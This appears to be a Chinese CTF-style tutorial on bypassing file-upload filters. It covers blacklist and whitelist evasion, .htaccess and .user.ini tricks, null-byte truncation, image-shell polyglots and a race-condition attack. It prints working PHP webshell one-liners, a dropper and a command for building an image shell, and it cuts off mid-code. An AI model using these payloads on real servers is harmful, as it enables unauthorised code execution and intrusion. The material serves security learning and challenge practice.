+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650898529-fc5c7f67-48e8-4a28-bc65-119cc6cfbd3b.png"></p>
+<h2 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>网站设立的文件上传检验主要是通过黑名单排除实现的。</p>
+<h4 id="特殊解析后缀名"><a href="#特殊解析后缀名" class="headerlink" title="特殊解析后缀名"></a>特殊解析后缀名</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650898522-7e22e006-bb4f-4c95-9271-dfe69c2712fb.png"></p>
+<p>由于开发时设置的黑名单规则不严谨，使得上传某些带有特殊后缀的文件时，文件能够成功绕过检测并当作成脚本文件执行。例如：php1、php2、php3、php4、php5、php6、php7、pht、phtm、phtml等</p>
+<p>&lt;注意&gt;：特殊后缀名能否被解析，关键看后台apache文件夹的conf&#x2F;httpd.conf文件中AddType application&#x2F;x-httpd-php .php .phtml 等等 是否包含了相应的后缀名</p>
+<h4 id="htaccess（apache）"><a href="#htaccess（apache）" class="headerlink" title=".htaccess（apache）"></a>.htaccess（apache）</h4><p>用户上传带有命令的.htaccess文件，可以让指定文件作为脚本语言解析。（前提是后端没有禁用）</p>
+<p>准备.htaccess文件，然后写入代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;XXX&quot;&gt;</span><br><span class="line"> SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传至后端，这样一来，Apache会将文件名为“XXX”的文件统一当作php文件解析。</p>
+<p>然后接着上传带有脚本命令的图片类型文件即可。</p>
+<h4 id="绕过exif-imagetype-上传-htaccess"><a href="#绕过exif-imagetype-上传-htaccess" class="headerlink" title="绕过exif_imagetype()上传.htaccess"></a>绕过exif_imagetype()上传.htaccess</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650898615-c682dac4-6efb-4b83-b0ab-744f39510184.png"></p>
+<p>.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define width 66</span><br><span class="line">#define height 66</span><br><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后蚁剑连接就可以</p>
+<h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>用户可以通过 .user.ini 文件来设置特定目录和子目录下的 PHP 配置。这些设置会覆盖全局 php.ini 的相应配置 </p>
+<p>首先我们编写一个”<strong>.user.ini</strong>“文件 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file=cmd.jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传cmd.jpg</p>
+<p> 我们并不能完全肯定upload目录下的主页文件是哪个，所以我们可以直接访问upload目录 </p>
+<p>用蚁剑连接，结合具体题目</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ae1b1446-fbe2-4179-90ac-3315ca849c79.challenge.ctf.show/upload/</span><br><span class="line">或</span><br><span class="line">http://node6.anna.nssctf.cn:23249/uploads/notion.php</span><br></pre></td></tr></table></figure>
+
+<h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>服务器在检查上传文件后缀名时，虽然黑名单列表中有相应的非法后缀，但是未考虑到字母大小写的影响（没有统一处理后缀名大小写），用户可以通过改变非法后缀名的某一个字母的大小写，从而达到绕过目的。</p>
+<p><strong>没有设置</strong>以下安全函数 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = strtolower($file_ext); //转换为小写</span><br></pre></td></tr></table></figure>
+
+<p>可以采用大小写绕过的方法：cmd.PHP</p>
+<h4 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h4><p>后端没有对文件名中的空格字符进行处理，使得截取到的后缀名字符串无法匹配对上黑名单中的字符串。</p>
+<p><strong>没有设置</strong>以下安全函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure>
+
+<p>文件名后缀加空格绕过：’cmd.php ‘</p>
+<h4 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h4><p>当后端没有对文件名末尾的点进行处理时（即没有设置相关函数去移除名字末尾的点），这时截取的后缀名中就带了点字符，使得截取到的后缀名字符串无法匹配对上黑名单中的字符串。Windows会将 <code>cmd.php.</code> 解释为没有扩展名的文件，因为末尾的点会被忽略。文件的实际名称会变成 <code>cmd.php</code>，但扩展名会被视为不存在</p>
+<p><strong>没有设置</strong>以下安全函数 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
+
+<p>在文件格式后面加点. ：cmd.php.</p>
+<h4 id="DATA绕过"><a href="#DATA绕过" class="headerlink" title="::$DATA绕过"></a>::$DATA绕过</h4><p>后端Windows的环境下，在php文件后缀名后面加上“::$DATA”,系统首先会将“::$DATA”后面的数据当作文件流处理，而不会检查后缀名,上传成功后，系统会自动将“ ::$DATA “去除。</p>
+<p><strong>没有设置</strong>以下安全函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure>
+
+<p>上传PHP一句话文件，抓包改后缀cmd.php::$DATA 然后使用蚁剑连接cmd.php <code>（注意蚁剑连接路径不要加上::$DATA）</code></p>
+<p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名</p>
+<h4 id="双点绕过"><a href="#双点绕过" class="headerlink" title="双点绕过"></a>双点绕过</h4><p>如果<strong>有设置</strong>以下安全函数 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点</span><br></pre></td></tr></table></figure>
+
+<p>可以构造cmd.php. .</p>
+<p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，即从字符串的尾部开始，从后向前删除点<code>.</code>，直到该字符串的末尾字符不是<code>.</code>为止但是遇到空格会停下来</p>
+<p>deldot()函数遇到空格会停止</p>
+<h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><p>如果<strong>有设置</strong>函数 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); //必须替换成空格</span><br></pre></td></tr></table></figure>
+
+<p>传<code>cmd.php</code> 然后用bp改后缀为<code>.pphphp</code></p>
+<h4 id="js马及php短标签绕过"><a href="#js马及php短标签绕过" class="headerlink" title="js马及php短标签绕过"></a>js马及php短标签绕过</h4><p>常用木马：</p>
+<p><strong>一句话木马：<?php eval($_POST['****cmd****']); ?></strong></p>
+<p>有时候会对一句话木马的<code>&lt;?</code>和<code>php</code>过滤 ，需要用到js马</p>
+<p><strong>js****马：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器开启了短标签支持，攻击者可以利用短标签绕过，简化为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;? eval($_REQUEST[&#x27;code&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=shell_exec($_GET[&#x27;cmd&#x27;])?&gt; #在PHP 5.4.0及更高版本中默认开启</span><br></pre></td></tr></table></figure>
+
+<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>网站设立的文件上传检验主要是通过白名单排除实现的。</p>
+<h4 id="修改MIME信息绕过"><a href="#修改MIME信息绕过" class="headerlink" title="修改MIME信息绕过"></a>修改MIME信息绕过</h4><p><strong>MIME头是什么？</strong></p>
+<p>MIME 头（MIME header，全称 <strong>Multipurpose Internet Mail Extensions 头部</strong>）是电子邮件或 HTTP 协议中用来描述数据类型、格式、编码方式等信息的<strong>元数据头</strong>。它的主要作用是告诉接收方<strong>如何正确理解和处理消息体中的数据</strong>。 </p>
+<p>MIME 头本质上就是消息的头部字段，常见的有：</p>
+<ul>
+<li><strong>Content-Type</strong> 指明消息体的媒体类型（MIME 类型）。 例如：<ul>
+<li><code>Content-Type: text/plain; charset=UTF-8</code> （普通文本）</li>
+<li><code>Content-Type: text/html; charset=UTF-8</code> （HTML 文本）</li>
+<li><code>Content-Type: image/png</code> （PNG 图片）</li>
+<li><code>Content-Type: multipart/mixed</code> （复合类型，比如邮件正文+附件）</li>
+</ul>
+</li>
+<li><strong>Content-Transfer-Encoding</strong> 指明数据在传输过程中使用的编码方式（因为某些系统只能传输 ASCII，需要把二进制转码）。 常见值：<ul>
+<li><code>7bit</code> （纯 ASCII 文本）</li>
+<li><code>quoted-printable</code> （主要用来编码带有特殊字符的文本）</li>
+<li><code>base64</code> （常用于二进制附件，比如图片、PDF）</li>
+</ul>
+</li>
+<li><strong>Content-Disposition</strong> 指定数据在客户端的处理方式。 例如：<ul>
+<li><code>inline</code> （内嵌显示）</li>
+<li><code>attachment; filename=&quot;report.pdf&quot;</code> （作为附件下载）</li>
+</ul>
+</li>
+<li><strong>MIME-Version</strong> 表示 MIME 的版本，通常是 <code>MIME-Version: 1.0</code></li>
+</ul>
+<p>我们上传文件会发送HTTP请求，在http包中会带有区分文件类型的MIME信息，网站后端可以通过MIME信息Content-Type字段判断文件类型。<strong>抓包工具可以任意修改 HTTP 请求里的 <strong><code>**Content-Type**</code></strong> 字段</strong>， 从而实现绕过。</p>
+<p>如果后端仅比对这个字段（比如只允许 <code>image/png</code>），攻击者可以将任意文件（例如 webshell.php）以 <code>Content-Type: image/png</code> 上传，从而绕过类型检查。 </p>
+<p>后端代码举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><p>“00 截断”（null byte truncation）利用的是操作系统和低级语言对字符串终止符的约定：在 C 语言及许多底层实现中，字符串以空字符 <code>&#39;\0&#39;</code>（即十六进制 <code>0x00</code>）作为结束标志。若攻击者在文本或路径中注入该字节，接受字符串的底层实现会在此处将其视为终结，从而截断后续内容。</p>
+<p>这种截断可以被用来绕过基于字符串或路径的白名单检查。例如在某些场景下，应用层逻辑看到的字符串（可能经过若干解析&#x2F;转码）未包含危险后缀，但在操作系统或底层 API 处理路径时，<code>0x00</code> 会导致真实文件名被截短，从而使恶意文件写入到意想不到的位置或规避后端过滤。</p>
+<p>使用条件：1.PHP版本&lt;5.3.29 2.php.ini配置中magic_quotes_gpc&#x3D;off</p>
+<p>如果<strong>有</strong>函数：(get和post同理)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"> </span><br><span class="line">if(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">$img_path = $_POST[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"> </span><br><span class="line">if(move_uploaded_file($temp_file,$img_path))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>含有函数move_uploaded_file 且白名单中最终文件的存放位置是以拼接的方式</p>
+<p><strong>get方式：</strong></p>
+<p>上传<code>cmd.png</code>用BP抓包修改参数，把upload&#x2F;后面加上<code>cmd.php%00</code></p>
+<p><code>**+号**</code><strong>的Hex是</strong><code>**2b**</code><strong>，这里我们要把它改为</strong><code>**00**</code></p>
+<p><strong>post方式：</strong></p>
+<p>上传<code>cmd.png</code>用BP抓包修改参数，在<code>../upload/</code> 路径下加上<code>cmd.php+``+号</code>是为了方便后面修改<code>Hex</code></p>
+<p><code>+号</code>的Hex是<code>2b</code>，这里我们要把它改为<code>00</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650898729-af3de17e-1cca-4ca3-942a-c71eec768d33.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650898629-f81b13d3-47e7-440e-b95a-5eaaca3139a2.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650899691-36eed06d-3346-483b-a565-ba1183524ae9.png"></p>
+<p>然后就可以放包了，复制图片地址并用蚁剑进行连接(注意删掉后面多余部分)，连接成功</p>
+<h4 id="字节标识与图片马绕过"><a href="#字节标识与图片马绕过" class="headerlink" title="字节标识与图片马绕过"></a>字节标识与图片马绕过</h4><p><strong>适用条件：存在文件包含模块</strong></p>
+<p>图片字节标识：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650899597-b2ba3e25-c6e0-43bd-871f-af497902f463.png"></p>
+<p>如果含有以下代码，说明检查字节标识</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650899797-2d720cb5-94e8-4491-bd31-58db22490790.png"></p>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getimagesize()</span><br><span class="line">与</span><br><span class="line">exif_imagetype()</span><br></pre></td></tr></table></figure>
+
+<p>有以下两种方法绕过：</p>
+<p><strong>法一：字节标识绕过</strong></p>
+<p>将.php改为.jpg后用记事本打开，在一句话木马前加上占位符aa</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650899945-f70cf9fc-a240-4aa2-b878-46d1525d6f82.png"></p>
+<p>用010editor打开，修改头两个字节为jpg对应的FF D8,保存一下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650900384-9d9085b7-560a-4230-afac-0a520f5de5a6.png"></p>
+<p>上传后，用文件包含刚上传的文件，比如?file&#x3D;.&#x2F;upload&#x2F;8888.jpg</p>
+<p>用蚁剑连接</p>
+<p><strong>法二：图片马绕过</strong></p>
+<p>通过cmd生成图片马 使用以下指令制作图片马</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy normal.jpg/b + cmd.php tupianma.jpg</span><br></pre></td></tr></table></figure>
+
+<p>上传后，用文件包含刚上传的文件，用蚁剑连接</p>
+<h4 id="GIF89a绕过"><a href="#GIF89a绕过" class="headerlink" title="GIF89a绕过"></a>GIF89a绕过</h4><p>有时会对文件内容进行检测，这时我们可以用GIF89a来伪装成图片</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650900909-1b857655-38ab-46f6-a97b-a4982a235f78.png"></p>
+<h4 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h4><p><strong>概念说明：</strong> 服务器在接收到用户上传的图片后，常会对其进行二次处理 —— 如裁剪、缩放、压缩或重编码 —— 并用处理后的结果替换原图。若上传的图片中包含恶意脚本或嵌入载荷，这些处理步骤往往会破坏或改变图像内部的数据结构，从而使原有的脚本失效或被清除。</p>
+<p><strong>基本原理：</strong> 通过对比处理前后的图像文件，分析哪些字节或数据块在渲染&#x2F;重编码过程中被保留不变。攻击者可针对这些“保留区”在上传时嵌入精心构造的数据（例如脚本片段），以期在二次处理后仍然保留足够的信息，达到绕过过滤或在后续使用时触发恶意行为的目的。</p>
+<p><strong>适用条件：存在文件包含模块</strong></p>
+<p>如果出现以下代码，需要使用二次渲染绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二次渲染：后端重写文件内容</span><br><span class="line">basename(path[,suffix]) ，没指定suffix则返回后缀名，有则不返回指定的后缀名</span><br><span class="line">strrchr(string,char)函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符。</span><br><span class="line">imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像</span><br><span class="line">imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像</span><br><span class="line"></span><br><span class="line">重写后会删去原图片马中的php部分，所以需要找到渲染后的图片里面没有发生变化的Hex地方，添加一句话，通过文件包含漏洞执行一句话</span><br><span class="line"></span><br><span class="line">一般通过.gif格式文件执行</span><br></pre></td></tr></table></figure>
+
+<p>将上传重写后的gif下载，通过010里面的比较工具对比（在tools里面）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650901186-7fdce5c0-9da9-4c73-94f9-cec486b8bc5d.png"></p>
+<p>点击match，随便找一个公共部分插入木马即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650901185-f971e630-67ea-4630-9530-251e69dd16c6.png"></p>
+<p>直接上传然后进行文件包含，蚁剑连接</p>
+<h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>绕过方法：burpsuite爆破</p>
+<p>让我们来看一道例题</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650901342-16e8f99e-2c49-45ca-8276-482c93719206.png"></p>
+<p>审计代码，发现文件先从临时目录被上传到服务器之后再进行白名单的判断</p>
+<p><strong>先上传，后删除，中间有一个极短的窗口期，文件是在服务器中的，可以进行操作——条件竞争漏洞</strong></p>
+<p><strong>在检测出不合法之前访问一次，从而生成小马</strong></p>
+<p>先上传含有小马的php文件，用burpsuite抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;cmd.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650901703-ef691d39-ea92-4aca-8348-f1b3bcfd502e.png"></p>
+<p>右键发送到攻击模块intruder，清除payload位置</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650902133-8a9c9814-f389-4ca6-bc98-976443774ef7.png"></p>
+<p>设置payload类型为null，无限重复</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650902453-08423344-cf52-40c0-8c1a-1c445ab0d6ac.png"></p>
+<p>设置线程为20，间隔为0</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650902782-e2443d60-2d15-4d42-96e2-736b50c7fa55.png"></p>
+<p>访问race.php并抓包，发送到intruder</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650903263-791110c7-fdb6-44ba-b500-3e0c8efe43fd.png"></p>
+<p>修改payload类型和线程</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650903749-9a6bec85-3928-4662-8142-7868940ef668.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650903780-1fa9b20e-7ea0-4922-95ed-ef8be2540c6c.png"></p>
+<p>同时启动上传和读取的攻击模块，查看记录会发现有一次访问成功的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650904542-4eb16014-b730-4b33-9e05-16abace7d81f.png"></p>
+<p>访问成功</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650904815-4b09d9f4-f1a4-443f-95fa-f4cdeb739de1.png"></p>
+<p>蚁剑连接，连接成功</p>
+<h4 id="先检查文件后缀再移动、改名"><a href="#先检查文件后缀再移动、改名" class="headerlink" title="先检查文件后缀再移动、改名"></a>先检查文件后缀再移动、改名</h4><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650905063-a2b39d51-1a6b-4e31-a6ed-cf2340b0b031.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2025/png/54428404/1759650905602-1737d890-09fa-4ee6-92be-f7f48c7c1eee.png"></p>
+<p>可以利用apache漏洞，将文件后缀改为.php.7z</p>
+<p>因为apache不能解析.7z后缀，所以会跳过直接解析.php后缀，从而实现绕过（注意nginx没有这个漏洞）</p>
+<p>然后利用条件竞争绕过</p>
+<h4 id="逻辑数组绕过"><a href="#逻辑数组绕过" class="headerlink" title="逻辑数组绕过"></a>逻辑数组绕过</h4><p>我们还是看一道例题</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$is_upload      = false;</span><br><span class="line"> $msg = null;</span><br><span class="line"> if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line"> //mime check</span><br><span class="line"> $allow_type =      array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line"> if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line"> $msg = &quot;禁止上传该类型文件!&quot;;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> //check filename</span><br><span class="line"> $file =      empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] :      $_POST[&#x27;save_name&#x27;]; //如果保存名称为空，则使用上传的文件名</span><br><span class="line"> if (!is_array($file)) &#123;</span><br><span class="line"> $file = explode(&#x27;.&#x27;,      strtolower($file)); //在“.”上分割字符串</span><br><span class="line"> &#125;</span><br><span class="line"> $ext = end($file); //指向数组最后一位，这里用来获取后缀名</span><br><span class="line"> </span><br><span class="line"> $allow_suffix =      array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line"> if (!in_array($ext,      $allow_suffix)) &#123;</span><br><span class="line"> $msg = &quot;禁止上传该后缀文件!&quot;;</span><br><span class="line"> </span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> $file_name =      reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; //拼接字符串数组中的头元素和尾部元素，以形成文件名 </span><br><span class="line"> $temp_file =      $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line"> $img_path =      UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line"> </span><br><span class="line"> if      (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line"> $msg = &quot;文件上传成功！&quot;;</span><br><span class="line"> $is_upload = true;</span><br><span class="line"> &#125; else &#123;</span><br><span class="line"> $msg = &quot;文件上传失败！&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;else&#123;</span><br><span class="line"> $msg = 